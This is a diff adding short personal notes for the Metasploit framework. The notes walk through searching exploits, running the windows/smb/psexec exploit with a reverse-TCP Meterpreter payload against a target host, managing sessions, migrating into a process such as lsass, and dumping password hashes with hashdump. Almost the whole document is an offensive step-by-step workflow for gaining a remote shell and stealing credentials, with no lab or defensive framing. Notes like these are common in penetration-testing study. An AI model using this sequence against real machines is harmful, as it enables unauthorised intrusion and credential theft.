@@ -1,3 +1,27 @@
 msfdb start
-msfconsole
+msfconsole -q #-q no banner
+show exploits #list
+search <serchterm> type:exploit rank:excellent/good/low check:yes/no
+help
+help search
+#use info from above to get more info on specific:
+info exploit/<os>/<sub>/<name> #info exploit/windows/smb/psexec
 
+use exploit/windows/smb/psexec
+
+set payload <payloadname> #set payload windows/meterpreter/reverse_tcp
+set RHOST <machine>
+set LHOST <local machine> #can also use interface if only 1 IP assigned: set lhost eth0
+exploit
+
+show options #show current module config
+
+background #run in the background
+sessions -l
+session -i <sessionumber> #switch to session #
+
+pid #find lsass pid
+
+migrate -N <processname> #migrate into process
+
+hashdump
